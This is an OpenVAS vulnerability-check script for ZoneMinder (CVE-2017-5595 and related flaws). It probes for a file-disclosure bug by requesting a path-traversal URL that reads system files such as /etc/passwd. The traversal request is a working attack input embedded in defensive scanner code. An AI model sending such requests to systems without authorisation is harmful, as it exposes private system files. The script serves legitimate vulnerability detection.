###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zoneminder_mult_vuln.nasl 11747 2018-10-04 09:58:33Z jschulte $
#
# ZoneMinder Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zoneminder:zoneminder";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106564");
  script_version("$Revision: 11747 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-02-06 09:54:32 +0700 (Mon, 06 Feb 2017)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2017-5595", "CVE-2017-5367", "CVE-2017-5368");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ZoneMinder Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_zoneminder_detect.nasl", "os_detection.nasl");
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("zoneminder/installed");

  script_tag(name:"summary", value:"ZoneMinder is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to read the /etc/passwd file.");

  script_tag(name:"insight", value:"ZoneMinder is prone to multiple vulnerabilities:

  - File disclosure and inclusion vulnerability exists due to unfiltered user-input being passed to readfile() in
  views/file.php which allows an authenticated attacker to read local system files (e.g. /etc/passwd) in the
  context of the web server user (www-data). (CVE-2017-5595)

  - Multiple reflected XSS (CVE-2017-5367)

  - CSRF vulnerability since no CSRF protection exists across the entire web app. (CVE-2017-5368)");

  script_tag(name:"impact", value:"An unauthenticated remote attacker may read arbitrary files.");

  script_tag(name:"solution", value:"Update to version 1.30.2 or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2017/Feb/11");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + "/index.php?view=file&path=/../../../../../" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
